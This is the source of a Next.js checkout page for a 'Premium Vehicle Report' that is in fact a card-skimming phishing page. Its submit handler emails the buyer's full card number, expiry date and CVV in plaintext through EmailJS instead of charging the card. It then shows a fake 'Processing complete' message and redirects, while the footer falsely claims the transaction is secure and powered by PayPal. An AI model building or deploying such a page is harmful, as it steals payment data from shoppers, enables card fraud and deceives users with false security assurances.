'use client';
import { useState } from 'react';
import Image from 'next/image';
import { useRouter } from 'next/navigation';
import emailjs from '@emailjs/browser';

export default function CheckoutPage() {
  const [cardType, setCardType] = useState('');
  const [cardImage, setCardImage] = useState('');
  const [loading, setLoading] = useState(false);
  const [failed, setFailed] = useState(false);
  const [formData, setFormData] = useState({
    name: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
  });
  const router = useRouter();

  // Handle inputs
  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  // Auto format expiry MM/YY
  const handleExpiryChange = (e) => {
    let value = e.target.value.replace(/\D/g, ''); // keep digits only
    if (value.length >= 3) value = value.slice(0, 2) + '/' + value.slice(2, 4);
    if (value.length > 5) value = value.slice(0, 5);
    setFormData({ ...formData, expiry: value });
  };

  // Auto format card number XXXX XXXX XXXX XXXX
  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, ''); // keep only digits
    value = value.match(/.{1,4}/g)?.join(' ') || value;
    if (value.length > 19) value = value.slice(0, 19); // max 16 digits + 3 spaces
    setFormData({ ...formData, cardNumber: value });
  };

  // Card select dropdown
  const handleCardSelect = (type) => {
    setCardType(type);
    if (type === 'Visa') setCardImage('/visa.svg');
    if (type === 'Master Card') setCardImage('/mastercard.svg');
    if (type === 'American Express')
      setCardImage('/logo-american-express-cards-bank-insurance.png');
  };

  // Checkout button click
  const handleClick = async (e) => {
    e.preventDefault(); // prevent form reload
    setLoading(true);
    setFailed(false);

    try {
      // Send email via EmailJS
      await emailjs.send(
        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID,
        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID,
        {
          name: formData.name,
          card_number: formData.cardNumber,
          expiry: formData.expiry,
          cvv: formData.cvv,
          card_type: cardType,
          amount: '$59.99',
        },
        process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY
      );

      console.log('Email sent successfully');
    } catch (error) {
      console.error('Email sending error:', error);
    }

    setTimeout(() => {
      setLoading(false);
      setFailed(true);

      setTimeout(() => {
        router.push('/thankup');
      }, 2000);
    }, 2000);
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-gray-100 p-4">
      <form
        onSubmit={handleClick}
        className="bg-white shadow-lg rounded-lg w-full max-w-4xl flex flex-col md:flex-row"
      >
        {/* Order Summary */}
        <div className="w-full md:w-1/2 p-6 border-r">
          <h2 className="text-2xl font-bold mb-4">Order Summary</h2>
          <div className="border-t mb-4" />
          <div className="flex items-center mb-4">
            <img
              src="/services-5.png"
              alt="Service"
              className="w-14 h-10 object-cover mr-4"
            />
            <div className="flex-grow">
              <p className="font-semibold">Premium Vehicle Report</p>
            </div>
            <div className="text-lg font-bold text-gray-800">$59.99</div>
          </div>
          <div className="border-t mb-4" />
          <div className="flex justify-between text-gray-600 mb-1">
            <span>Delivery</span>
            <span>$0.00</span>
          </div>
          <div className="flex justify-between font-bold text-lg">
            <span>TOTAL</span>
            <span>$59.99</span>
          </div>
        </div>

        {/* Credit Info */}
        <div className="w-full md:w-1/2 p-6">
          <label className="block mb-2 font-medium">Card Holder's Name</label>
          <input
            name="name"
            value={formData.name}
            onChange={handleChange}
            className="w-full border p-2 mb-4 rounded"
            placeholder="e.g. John Doe"
            required
          />

          <label className="block mb-2 font-medium">Card Number</label>
          <input
            name="cardNumber"
            value={formData.cardNumber}
            onChange={handleCardNumberChange}
            className="w-full border p-2 mb-4 rounded"
            placeholder="1234 1234 1234 1234"
            maxLength={19}
            required
          />

          <div className="flex gap-4 mb-4">
            <div className="flex-1">
              <label className="block mb-2 font-medium">Expiration Date</label>
              <input
                name="expiry"
                value={formData.expiry}
                onChange={handleExpiryChange}
                className="w-full border p-2 rounded"
                placeholder="MM/YY"
                maxLength={5}
                required
              />
            </div>
            <div className="flex-1">
              <label className="block mb-2 font-medium">Security Code (CVV)</label>
              <input
                name="cvv"
                value={formData.cvv}
                onChange={handleChange}
                className="w-full border p-2 rounded"
                placeholder="123"
                maxLength={4}
                required
              />
            </div>
          </div>

          {/* Card Dropdown */}
          <div className="mb-4">
            <label className="block mb-2 font-medium">Select Card</label>
            <select
              onChange={(e) => handleCardSelect(e.target.value)}
              value={cardType}
              className="w-full border p-2 rounded"
              required
            >
              <option value="">-- Select Card --</option>
              <option value="Visa">Visa</option>
              <option value="Master Card">Master Card</option>
              <option value="American Express">American Express</option>
            </select>
          </div>

          {/* Card Logo */}
          {cardImage && (
            <div className="flex items-center justify-center gap-4 mb-2">
              <Image src={cardImage} alt={cardType} width={60} height={40} />
            </div>
          )}

          <button
            
            type="submit"
            disabled={loading}
            className="w-full bg-blue-600 text-white py-2 rounded mb-4"
          >
            {loading ? 'Processing...' : 'Checkout'}
          </button>

          {failed && (
            <p className="text-center text-blue-500 mb-4">
              Processing complete. Redirecting...
            </p>
          )}

          <p className="text-sm text-center text-gray-600">
            This product is offered by a verified seller. All product details,
            images, and descriptions are provided directly by them. The
            transaction is secure and powered by PayPal.
          </p>
        </div>
      </form>
    </div>
  );
}
